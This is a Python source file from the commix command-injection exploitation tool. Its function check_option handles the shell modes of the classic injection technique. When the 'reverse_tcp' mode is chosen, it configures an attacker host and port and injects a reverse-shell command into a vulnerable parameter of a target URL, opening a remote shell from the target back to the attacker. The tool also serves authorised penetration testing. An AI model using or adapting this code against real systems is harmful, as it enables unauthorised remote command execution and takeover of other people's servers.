#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix project (http://commixproject.com).
Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import urllib
import urlparse

from src.utils import menu
from src.utils import settings

from src.core.injections.controller import checks
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.shells import reverse_tcp
from src.core.injections.results_based.techniques.classic import cb_injector

"""
Check commix shell options
"""
def check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result):
  os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
  if os_shell_option == False:
    if no_result == True:
      return False
    else:
      return True  

  elif os_shell_option == "quit":                    
    sys.exit(0)

  if os_shell_option == "os_shell": 
    warn_msg = "You are already into the 'os_shell' mode."
    print settings.print_warning_msg(warn_msg)+ "\n"

  elif os_shell_option == "reverse_tcp":
    settings.REVERSE_TCP = True
    # Set up LHOST / LPORT for The reverse TCP connection.
    reverse_tcp.configure_reverse_tcp()
    if settings.REVERSE_TCP == False:
      return
    while True:
      if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
        result = checks.check_reverse_tcp_options(settings.LHOST)
      else:  
        cmd = reverse_tcp.reverse_tcp_options()
        result = checks.check_reverse_tcp_options(cmd)
      if result != None:
        if result == 0:
          return False
        elif result == 1 or result == 2:
          go_back_again = True
          settings.REVERSE_TCP = False
          return
      # Command execution results.
      whitespace = settings.WHITESPACE[0]
      response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)

      # Evaluate injection results.
      shell = cb_injector.injection_results(response, TAG, cmd)
      if settings.VERBOSITY_LEVEL >= 1:
        print ""
      err_msg = "The reverse TCP connection has failed!"
      print settings.print_critical_msg(err_msg)
  else:
    pass
